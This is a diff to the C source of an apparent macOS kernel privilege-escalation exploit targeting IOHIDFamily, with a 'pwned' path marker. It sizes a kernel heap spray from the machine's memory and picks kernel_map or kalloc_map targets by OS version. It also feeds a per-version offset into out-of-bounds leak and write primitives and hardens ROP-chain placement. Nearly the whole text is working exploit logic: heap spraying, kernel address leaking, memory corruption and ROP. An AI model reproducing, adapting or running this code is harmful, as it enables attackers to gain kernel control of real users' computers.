@@ -14,12 +14,13 @@
 #include <mach/mach.h>
 #include <mach-o/loader.h>
 
+#include <CoreFoundation/CoreFoundation.h> // kCFCoreFoundationVersionNumber
 #include <IOKit/IOReturn.h>     // kIO*
 #include <IOKit/IOKitLib.h>     // IO*
 #include <IOKit/hidsystem/IOHIDShared.h> // kIOHID
 
 #include "common.h"             // LOG, ERR, FOREACH_CMD, filemap_t, map_file, unmap_file, pid_for_path
-#include "config.h"             // OFFSET_AMOUNT
+#include "config.h"             // KERNEL_SPRAY_AMOUNT, *_OFFSET_AMOUNT
 #include "exploit.h"            // shmem_get_rounded_size,
 #include "heap.h"               // payload_*, heap_*
 #include "kaslr.h"              // SLIDE_*, get_kernel_slide
@@ -35,38 +36,11 @@ extern const unsigned int helper_len;
 #define PWNAGE_PATH "/System/pwned"
 
 const uint64_t SET_CURSOR_ENABLED_METHOD_INDEX = 2;
-const useconds_t EXPLOIT_TIMEOUT = 1000000; // 1s
 
 #ifdef IOHIDEOUS_READ /* false */
 const uint64_t REGISTER_DISPLAY_METHOD_INDEX = 7;
 const uint64_t UNREGISTER_DISPLAY_METHOD_INDEX = 8;
 #endif
-
-typedef struct
-{
-    uint64_t image1Size;
-    uint64_t imageSize;
-    uint32_t image1Pages;
-    uint32_t imagePages;
-    uint32_t booterStart;
-    uint32_t smcStart;
-    uint32_t booterDuration;
-    uint32_t booterConnectDisplayDuration;
-    uint32_t booterSplashDuration;
-    uint32_t booterDuration0;
-    uint32_t booterDuration1;
-    uint32_t booterDuration2;
-    uint32_t trampolineDuration;
-    uint32_t kernelImageReadDuration;
-
-    uint32_t graphicsReadyTime;
-    uint32_t wakeNotificationTime;
-    uint32_t lockScreenReadyTime;
-    uint32_t hidReadyTime;
-
-    uint32_t wakeCapability;
-    uint32_t resvA[15];
-} hibernate_statistics_t;
 
 // signal handler
 static void ignore(int signo)
@@ -109,6 +83,7 @@ typedef struct
 #else
     uint32_t rop_hi;
 #endif
+    int32_t offset_amount;
 } cb_args_t;
 
 timeout_args_t *global_timeout_args = NULL;
@@ -211,8 +186,39 @@ int main(int argc, const char **argv)
     size_t rounded_size = pagesize * 3;
     LOG("Using struct size 0x%lx", rounded_size);
 
+    // This calculates the size of the kalloc_map, which the kernel sets
+    // to a 32th of the physical memory size, with a minimum of 128M.
+    size_t memsize = 0;
+    size_t outsize = sizeof(memsize);
+    if(sysctlbyname("hw.memsize", &memsize, &outsize, NULL, 0) != 0)
+    {
+        ERR("sysctl(\"hw.memsize\") failed: %s", strerror(errno));
+        goto out1;
+    }
+    memsize >>= 5;
+    if(memsize < 0x8000000)
+    {
+        memsize = 0x8000000;
+    }
+
+    int32_t offset_amount;
+    // If we go for the kernel_map rather than the kalloc_map, we need to add some more
+    if(kCFCoreFoundationVersionNumber < 1400) // Sierra and lower
+    {
+        LOG("Targeting kernel_map...");
+        memsize += KERNEL_SPRAY_AMOUNT;
+        offset_amount = KERNEL_OFFSET_AMOUNT;
+    }
+    else // High Sierra
+    {
+        LOG("Targeting kalloc_map...");
+        offset_amount = KALLOC_OFFSET_AMOUNT;
+    }
+    LOG("Spray size is 0x%lx...", memsize);
+    LOG("Offset amount is %s0x%x...", offset_amount < 0 ? "-" : "", offset_amount < 0 ? -offset_amount : offset_amount);
+
     uint32_t payload_offset = 0;
-    if(!heap_init(rounded_size))
+    if(!heap_init(memsize, rounded_size))
     {
         goto out1;
     }
@@ -347,7 +353,7 @@ int main(int argc, const char **argv)
     uint32_t leak = 0;
     for(int off = 0x1000; leak == 0; off = (off + 0x1000) % rounded_size)
     {
-        if(leak_uint32_prepare(client, shmem_addr, OFFSET_AMOUNT + off) != KERN_SUCCESS)
+        if(leak_uint32_prepare(client, shmem_addr, offset_amount + off) != KERN_SUCCESS)
         {
             goto out3;
         }
@@ -414,7 +420,7 @@ int main(int argc, const char **argv)
     uint32_t *hib_ptr = (uint32_t*)&hib_addr;
     for(int off = 0x0; off < 3 * pagesize; off += pagesize)
     {
-        if(write_uint32(client, shmem_addr, OFFSET_AMOUNT + off, hib_ptr[0]) != KERN_SUCCESS)
+        if(write_uint32(client, shmem_addr, offset_amount + off, hib_ptr[0]) != KERN_SUCCESS)
         {
             goto out3;
         }
@@ -477,6 +483,7 @@ int main(int argc, const char **argv)
 #else
         .rop_hi = rop_ptr[1],
 #endif
+        .offset_amount = offset_amount,
     };
     ret = heap_spray(master, payload_offset, NULL, 0, &cb, &args);
 
@@ -888,7 +895,7 @@ static kern_return_t cb(void *arg)
     // Trick: shmem can have upper 32 bits 0xffffff91 or 0xffffff92, but
     // the lower 32 bits are either very high or very low depending on that.
     // Perfect case for signed int addition. :P
-    val -= args->vtab_lo + OFFSET_AMOUNT;
+    val -= args->vtab_lo + args->offset_amount;
     kernel_addr = 0xffffff9200000000ULL + val;
 #else
     hibernate_statistics_t hib;
@@ -910,7 +917,7 @@ static kern_return_t cb(void *arg)
     // giving us the buffer address we need for the stage 2 payload.
 
     memcpy(&kernel_addr, (char*)&hib.graphicsReadyTime + args->rop->OSArray_array_offset, sizeof(kernel_addr));
-    kernel_addr -= OFFSET_AMOUNT;
+    kernel_addr -= args->offset_amount;
 #endif
     printf("\n"); // from the percentage counter
     LOG("Shmem kernel address: 0x%016llx", kernel_addr);
@@ -928,7 +935,7 @@ static kern_return_t cb(void *arg)
 
     // In this callback function, our corrupted object at offset OFFSET_AMOUNT has been freed.
     // Using 2 full payload sized guarantees that we land in an object that still exists.
-    int32_t add = OFFSET_AMOUNT + 2 * (HEAP_PAYLOAD_NUM_ARRAYS * 3 * args->pagesize);
+    int32_t add = args->offset_amount + 2 * (HEAP_PAYLOAD_NUM_ARRAYS * 3 * args->pagesize);
     for(int off = 0x0; off < 3 * args->pagesize; off += args->pagesize)
     {
         kern_return_t ret = write_uint32(args->client, args->shmem_addr, add + off, args->hib_lo);
@@ -938,9 +945,13 @@ static kern_return_t cb(void *arg)
         }
     }
 
+    if(rop_chain(args->rop, (void*)args->shmem_addr, kernel_addr) != 0)
+    {
+        ERR("ROP chain exceeds 0x1000 bytes!");
+        return KERN_FAILURE;
+    }
     // Our calculated address has the chance of being off by one or two pages,
     // but we just put out ROP chain at all possible locations...
-    rop_chain(args->rop, (void*)args->shmem_addr, kernel_addr);
     memcpy((void*)(args->shmem_addr +     args->pagesize), (void*)args->shmem_addr, args->pagesize);
     memcpy((void*)(args->shmem_addr + 2 * args->pagesize), (void*)args->shmem_addr, args->pagesize);
 
